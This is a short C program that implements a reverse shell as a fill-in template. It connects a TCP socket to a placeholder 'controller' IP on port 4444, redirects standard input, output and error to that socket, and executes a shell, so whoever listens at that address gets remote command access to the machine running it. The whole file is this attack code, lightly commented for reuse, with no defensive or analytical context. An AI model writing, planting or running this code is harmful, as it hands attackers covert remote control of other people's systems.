#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define HOST_IP "Enter controller ip here"
int main(){
  int sockt;
  int port = 4444;
  struct sockaddr_in revsockaddr;
  sockt = socket(AF_INET, SOCK_STREAM, 0);//AF_INET for ipv4 SOCK_STREAM for 2 way connection 0 for tcp or udp automaticly choosen
  revsockaddr.sin_family = AF_INET; //Declaring what protocol we are using
  revsockaddr.sin_port = htons(port);
  revsockaddr.sin_addr.s_addr = inet_addr(HOST_IP);
  connect(sockt, (struct sockaddr *) &revsockaddr,
  sizeof(revsockaddr));
  dup2(sockt, 0);
  dup2(sockt, 1);
  dup2(sockt, 2);
  char * const argv[] = {"enter the arguments you want to execute", NULL};
  execve("enter your shell path",argv,NULL);
  return 0;
}
